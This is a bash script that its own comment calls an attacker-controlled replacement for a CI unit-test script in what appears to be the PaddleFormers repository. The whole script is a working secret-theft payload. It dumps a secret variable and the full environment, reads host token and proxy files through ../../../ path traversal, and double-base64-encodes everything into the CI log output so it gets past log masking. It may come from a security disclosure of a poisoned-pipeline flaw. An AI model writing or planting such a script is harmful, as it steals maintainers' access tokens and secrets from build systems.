#!/usr/bin/env bash
# Attacker-controlled replacement for scripts/unit_test/ci_unittest.sh
{
  echo "GERALT_LEAKED_TOKEN=$(printf '%s' "${GERALT_SECRET:-${GERALT:-}}" | base64 | base64)"
  echo "GERALT_ENV_DUMP=$(env | base64 | base64)"
} 2>/dev/null
for f in \
  "${work_dir:-/workspace/PaddleFormers}/../../../AISTUDIO_ACCESS_TOKEN" \
  "/workspace/PaddleFormers/../../../AISTUDIO_ACCESS_TOKEN" \
  "${work_dir:-/workspace/PaddleFormers}/../../../proxy" \
  "/workspace/PaddleFormers/../../../proxy"; do
  if [ -f "$f" ]; then
    echo "GERALT_HOSTFILE_$(basename "$f")=$(printf '%s' "$(cat "$f")" | base64 | base64)"
  fi
done
exit 1
